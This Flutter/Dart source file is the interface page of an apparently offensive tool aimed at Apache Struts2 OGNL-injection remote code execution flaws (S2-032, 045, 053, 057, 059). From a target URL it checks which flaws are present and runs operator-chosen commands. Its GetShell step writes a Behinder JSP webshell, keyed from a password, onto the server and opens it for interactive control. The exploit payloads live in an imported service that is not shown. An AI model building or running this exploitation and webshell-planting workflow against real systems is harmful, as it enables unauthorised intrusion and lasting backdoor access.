import 'dart:convert';

import 'package:crypto/crypto.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show Clipboard, ClipboardData, rootBundle;

import '../../app/constants.dart';
import '../../database/database_helper.dart';
import '../../exp/vulhub/struts2_exp_service.dart';
import '../../models/project.dart';
import '../../models/webshell.dart';
import '../../theme/app_theme.dart';
import '../webshell_interactive_page.dart';

class Struts2ExpPage extends StatelessWidget {
  const Struts2ExpPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgDark,
      appBar: AppBar(
        backgroundColor: AppColors.bgElevated,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back),
          onPressed: () => Navigator.of(context).pop(),
        ),
        title: Row(
          children: [
            const Icon(Icons.bolt, color: AppColors.primary),
            const SizedBox(width: 8),
            Text('Apache Struts2 S2-032/045/053/057/059 RCE',
                style: AppTextStyles.heading(size: 14, color: AppColors.primary)),
          ],
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            _InfoCard(
              icon: Icons.bolt,
              title: 'Apache Struts2 RCE',
              subtitle: 'S2-032 / S2-045 / S2-053 / S2-057 / S2-059 — OGNL 表达式注入',
            ),
            const SizedBox(height: 16),
            const Expanded(child: _Struts2Card()),
          ],
        ),
      ),
    );
  }
}

class _Struts2Card extends StatefulWidget {
  const _Struts2Card();
  @override
  State<_Struts2Card> createState() => _Struts2CardState();
}

class _Struts2CardState extends State<_Struts2Card> {
  final _urlCtrl = TextEditingController();
  final _cmdCtrl = TextEditingController(text: 'id');
  final _timeoutCtrl = TextEditingController();
  final _pathCtrl = TextEditingController(text: 'struts2-showcase');
  final _logScroll = ScrollController();
  final _passwordCtrl = TextEditingController(
    text: AppConstants.defaultShellPassword,
  );

  Struts2VulnType _selected = Struts2VulnType.s2045;
  String _log = '';
  bool _running = false;

  void _appendLog(String line) {
    setState(() {
      final lines = _log.isEmpty ? <String>[] : _log.split('\n');
      lines.add(line);
      if (lines.length > AppConstants.logBufferSize) {
        lines.removeRange(0, lines.length - AppConstants.logBufferSize);
      }
      _log = lines.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScroll.hasClients) {
        _logScroll.animateTo(_logScroll.position.maxScrollExtent,
            duration: const Duration(milliseconds: 100), curve: Curves.easeOut);
      }
    });
  }

  Struts2ExpService _svc() => Struts2ExpService(
        url: _urlCtrl.text.trim(),
        timeout: Duration(
          seconds: int.tryParse(_timeoutCtrl.text.trim()) ??
              AppConstants.defaultHttpTimeoutSeconds,
        ),
      );

  Future<void> _check() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
    setState(() => _running = true);
    _appendLog('[*] 检测 ${_selected.label}...');
    try {
      final r = await _svc().checkSingle(_selected, path: _pathCtrl.text.trim());
      if (r.vulnerable) {
        _appendLog('[+] 存在漏洞: ${r.vulnName}');
        _appendLog('[i] ${r.detail}');
      } else {
        _appendLog('[-] 未检测到 ${r.vulnName}');
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _checkAll() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
    setState(() => _running = true);
    _appendLog('[*] 批量检测所有 Struts2 CVE...');
    try {
      final svc = _svc();
      final path = _pathCtrl.text.trim();
      Struts2VulnType? firstHit;
      for (final t in Struts2VulnType.values) {
        _appendLog('[*] 检测 ${t.label}...');
        // S2-053 固定使用 hello.action 路径，不受路径框影响
        final effectivePath = t == Struts2VulnType.s2053 ? 'hello.action' : path;
        final r = await svc.checkSingle(t, path: effectivePath);
        if (r.vulnerable) {
          _appendLog('[+] ${r.vulnName}: ${r.detail}');
          firstHit ??= t;
        } else {
          _appendLog('[-] ${r.vulnName}');
        }
      }
      if (firstHit != null && mounted) {
        setState(() {
          _selected = firstHit!;
          if (firstHit == Struts2VulnType.s2053) {
            _pathCtrl.text = 'hello.action';
          } else if (firstHit == Struts2VulnType.s2057) {
            _pathCtrl.text = 'struts2-showcase';
          }
        });
        _appendLog('[*] 已自动选择首个命中漏洞: ${firstHit.label}');
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _execRce() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => _running = true);
    _appendLog('[*] 执行命令 (${_selected.label}): $cmd');
    try {
      final out = await _svc().execRce(_selected, cmd, path: _pathCtrl.text.trim());
      if (out != null && out.isNotEmpty) {
        _appendLog('[+] 输出:\n$out');
      } else {
        _appendLog('[-] 无输出或执行失败');
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _getShell() async {
    final url = _urlCtrl.text.trim();
    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
    setState(() => _running = true);
    _appendLog('[*] GetShell (${_selected.label})...');
    try {
      final password = _passwordCtrl.text.trim().isEmpty
          ? AppConstants.defaultShellPassword
          : _passwordCtrl.text.trim();
      var shellContent = await rootBundle.loadString('assets/defaults/payloads/jsp_behinder.jsp');
      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
      shellContent = shellContent.replaceFirst(RegExp(r'String k="[0-9a-f]{16}"'), 'String k="$key"');
      final shellUrl = await _svc().getShell(
        _selected,
        shellContent,
        path: _pathCtrl.text.trim(),
        onLog: _appendLog,
      );
      if (shellUrl != null && mounted) {
        await _openWebshellFromResult(context, shellUrl, password);
      }
    } catch (e) {
      _appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _openWebshellFromResult(BuildContext context, String shellUrl, String password) async {
    final now = DateTime.now();
    Webshell ws = Webshell(
      id: 0, projectId: 0,
      name: 'Struts2 GetShell',
      url: shellUrl,
      password: password,
      type: 'jsp',
      method: 'POST',
      status: 1,
      connectorType: 'jsp_behinder',
      createdAt: now,
      updatedAt: now,
    );
    try {
      final db = DatabaseHelper();
      final project = await _showProjectPicker(context, db);
      if (project != null) {
        ws = await db.createWebshell(
          project.id,
          name: 'Struts2 GetShell',
          url: shellUrl,
          password: password,
          method: 'POST',
          type: 'jsp',
          connectorType: 'jsp_behinder',
        );
      }
    } catch (_) {}
    if (!mounted) return;
    Navigator.of(context).push(MaterialPageRoute(
      builder: (_) => WebshellInteractivePage(webshell: ws),
    ));
  }

  Future<Project?> _showProjectPicker(BuildContext context, DatabaseHelper db) async {
    final projects = await db.getAllProjects();
    if (projects.isEmpty) return _showCreateProjectDialog(context, db);
    return showDialog<Project>(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: AppColors.bgCard,
        title: Text('选择项目', style: AppTextStyles.heading(color: AppColors.primary)),
        content: SizedBox(
          width: 320,
          child: ListView.builder(
            shrinkWrap: true,
            itemCount: projects.length,
            itemBuilder: (_, i) => ListTile(
              title: Text(projects[i].name, style: AppTextStyles.body(color: AppColors.textPrimary)),
              subtitle: Text(projects[i].domain, style: AppTextStyles.caption(color: AppColors.textSecondary)),
              onTap: () => Navigator.pop(ctx, projects[i]),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: Text('跳过', style: AppTextStyles.body(color: AppColors.textSecondary)),
          ),
        ],
      ),
    );
  }

  Future<Project?> _showCreateProjectDialog(BuildContext context, DatabaseHelper db) async {
    final nameCtrl = TextEditingController();
    final domainCtrl = TextEditingController();
    final ok = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: AppColors.bgCard,
        title: Text('暂无项目', style: AppTextStyles.heading(color: AppColors.primary)),
        content: SizedBox(
          width: 360,
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.stretch, children: [
            Text('请先创建一个项目以保存 Webshell', style: AppTextStyles.caption(color: AppColors.textSecondary)),
            const SizedBox(height: 16),
            TextField(controller: nameCtrl, autofocus: true,
              style: const TextStyle(color: AppColors.textPrimary),
              decoration: InputDecoration(labelText: '项目名称', hintText: '例如：目标站点',
                hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
                labelStyle: const TextStyle(color: AppColors.textSecondary),
                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.5))),
                focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary)))),
            const SizedBox(height: 12),
            TextField(controller: domainCtrl,
              style: const TextStyle(color: AppColors.textPrimary),
              decoration: InputDecoration(labelText: '域名或ID *', hintText: '例如：example.com',
                hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
                labelStyle: const TextStyle(color: AppColors.textSecondary),
                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.5))),
                focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary)))),
          ]),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx, false),
            child: Text('取消', style: AppTextStyles.body(color: AppColors.textSecondary))),
          FilledButton(
            onPressed: () {
              if (nameCtrl.text.trim().isEmpty || domainCtrl.text.trim().isEmpty) return;
              Navigator.pop(ctx, true);
            },
            style: FilledButton.styleFrom(backgroundColor: AppColors.primary),
            child: Text('创建', style: AppTextStyles.body(color: AppColors.bgDark))),
        ],
      ),
    );
    if (ok == true && nameCtrl.text.trim().isNotEmpty && domainCtrl.text.trim().isNotEmpty) {
      return db.createProject(nameCtrl.text.trim(), domain: domainCtrl.text.trim());
    }
    return null;
  }

  @override
  void dispose() {
    _urlCtrl.dispose(); _cmdCtrl.dispose(); _timeoutCtrl.dispose();
    _pathCtrl.dispose(); _logScroll.dispose(); _passwordCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return _ExpCardShell(
      running: _running,
      log: _log,
      logScroll: _logScroll,
      onClearLog: () => setState(() => _log = ''),
      leftPanel: SingleChildScrollView(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _sectionTitle('目标配置'),
            _tf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
            const SizedBox(height: 8),
            _tf(_timeoutCtrl, '超时(s)', '10', type: TextInputType.number),
            const SizedBox(height: 8),
            _tf(_pathCtrl, 'S2-053/057 路径', 'struts2-showcase / hello'),
            const SizedBox(height: 16),
            _sectionTitle('漏洞选择'),
            DropdownButtonFormField<Struts2VulnType>(
              initialValue: _selected,
              isExpanded: true,
              dropdownColor: AppColors.bgElevated,
              style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
              items: Struts2VulnType.values
                  .map((t) => DropdownMenuItem(value: t, child: Text(t.label, overflow: TextOverflow.ellipsis)))
                  .toList(),
              onChanged: _running ? null : (t) {
                if (t == null) return;
                setState(() => _selected = t);
                if (t == Struts2VulnType.s2053) {
                  _pathCtrl.text = 'hello.action';
                } else if (t == Struts2VulnType.s2057) {
                  _pathCtrl.text = 'struts2-showcase';
                }
              },
              decoration: _inputDec('CVE', ''),
            ),
            const SizedBox(height: 8),
            Row(children: [
              _btn('检测', _running ? null : _check),
              const SizedBox(width: 8),
              _btn('检测全部', _running ? null : _checkAll),
            ]),
            const SizedBox(height: 16),
            _sectionTitle('命令执行'),
            _tf(_cmdCtrl, '命令', 'id'),
            const SizedBox(height: 8),
            _btn('执行命令', _running ? null : _execRce),
            const SizedBox(height: 16),
            _sectionTitle('GetShell'),
            _tf(_passwordCtrl, '冰蝎密码', 'mAtrix_911'),
            const SizedBox(height: 8),
            _btn('GetShell (写入冰蝎 JSP)', _running ? null : _getShell),
          ],
        ),
      ),
    );
  }
}

// ── Shared helpers (duplicated per page for independence) ──────────────────

class _InfoCard extends StatelessWidget {
  final IconData icon;
  final String title;
  final String subtitle;
  const _InfoCard({required this.icon, required this.title, required this.subtitle});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
        boxShadow: [BoxShadow(color: AppColors.primary.withValues(alpha: 0.06), blurRadius: 12, offset: const Offset(0, 2))],
      ),
      child: Row(
        children: [
          Container(
            width: 44, height: 44,
            decoration: BoxDecoration(
              gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight, colors: [
                AppColors.primary.withValues(alpha: 0.2), AppColors.primary.withValues(alpha: 0.08),
              ]),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: AppColors.primary.withValues(alpha: 0.4)),
            ),
            child: Icon(icon, color: AppColors.primary, size: 22),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(title, style: AppTextStyles.heading(size: 14, color: AppColors.textPrimary)),
              const SizedBox(height: 4),
              Text(subtitle, style: AppTextStyles.caption(size: 12, color: AppColors.textSecondary)),
            ]),
          ),
        ],
      ),
    );
  }
}

class _ExpCardShell extends StatelessWidget {
  final bool running;
  final String log;
  final ScrollController logScroll;
  final VoidCallback onClearLog;
  final Widget leftPanel;
  const _ExpCardShell({
    required this.running, required this.log, required this.logScroll,
    required this.onClearLog, required this.leftPanel,
  });

  Color _lineColor(String line) {
    if (line.startsWith('[+]')) return AppColors.primary;
    if (line.startsWith('[!]')) return AppColors.red;
    if (line.startsWith('[-]')) return AppColors.textMuted;
    if (line.startsWith('[*]')) return AppColors.cyan;
    if (line.startsWith('[i]')) return AppColors.cyan.withValues(alpha: 0.9);
    return AppColors.textSecondary;
  }

  TextSpan _richLog() {
    if (log.isEmpty) return TextSpan(text: '> 等待操作', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Monaco'));
    final lines = log.split('\n');
    final base = AppTextStyles.terminal(size: 12, color: AppColors.textSecondary);
    return TextSpan(children: [
      for (var i = 0; i < lines.length; i++)
        TextSpan(
          text: lines[i] + (i < lines.length - 1 ? '\n' : ''),
          style: base.copyWith(
            color: _lineColor(lines[i]),
            fontWeight: lines[i].startsWith('[+]') || lines[i].startsWith('[!]') ? FontWeight.w600 : null,
          ),
        ),
    ]);
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Flexible(flex: 1, child: leftPanel),
          const SizedBox(width: 16),
          Flexible(
            flex: 1,
            child: Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: AppColors.bgDark,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: AppColors.border),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  Row(children: [
                    Container(
                      width: 6, height: 6,
                      margin: const EdgeInsets.only(right: 6),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: running ? AppColors.primary : AppColors.textMuted,
                      ),
                    ),
                    Text(running ? '运行中' : '空闲',
                        style: AppTextStyles.caption(size: 11, color: running ? AppColors.primary : AppColors.textSecondary)),
                    const Spacer(),
                    TextButton.icon(
                      onPressed: log.isEmpty ? null : () async {
                        await Clipboard.setData(ClipboardData(text: log));
                        if (context.mounted) {
                          ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text('已复制'), duration: Duration(seconds: 1)));
                        }
                      },
                      icon: const Icon(Icons.copy, size: 14),
                      label: const Text('复制'),
                      style: TextButton.styleFrom(foregroundColor: AppColors.textSecondary, textStyle: const TextStyle(fontSize: 11)),
                    ),
                    TextButton.icon(
                      onPressed: log.isEmpty ? null : onClearLog,
                      icon: const Icon(Icons.clear_all, size: 14),
                      label: const Text('清空'),
                      style: TextButton.styleFrom(foregroundColor: AppColors.textSecondary, textStyle: const TextStyle(fontSize: 11)),
                    ),
                  ]),
                  const Divider(height: 1, color: AppColors.border),
                  const SizedBox(height: 4),
                  Expanded(
                    child: SingleChildScrollView(
                      controller: logScroll,
                      child: SelectableText.rich(
                        _richLog(),
                        style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

Widget _sectionTitle(String t) => Padding(
  padding: const EdgeInsets.only(bottom: 6),
  child: Row(children: [
    Container(width: 3, height: 14,
        decoration: BoxDecoration(color: AppColors.primary.withValues(alpha: 0.6), borderRadius: BorderRadius.circular(2))),
    const SizedBox(width: 8),
    Text(t, style: AppTextStyles.heading(size: 12, color: AppColors.textSecondary)),
  ]),
);

InputDecoration _inputDec(String label, String hint) => InputDecoration(
  labelText: label, hintText: hint,
  hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
  floatingLabelBehavior: FloatingLabelBehavior.always,
  isDense: true, contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
  border: OutlineInputBorder(borderRadius: BorderRadius.circular(8)),
  enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: AppColors.border)),
  focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.6))),
);

Widget _tf(TextEditingController c, String label, String hint, {TextInputType? type}) => TextField(
  controller: c,
  style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
  keyboardType: type,
  decoration: _inputDec(label, hint),
);

Widget _btn(String label, VoidCallback? onPressed, {bool enabled = true}) => SizedBox(
  height: 32,
  child: ElevatedButton(
    onPressed: enabled ? onPressed : null,
    style: ElevatedButton.styleFrom(textStyle: const TextStyle(fontSize: 11), padding: const EdgeInsets.symmetric(horizontal: 12)),
    child: Text(label),
  ),
);
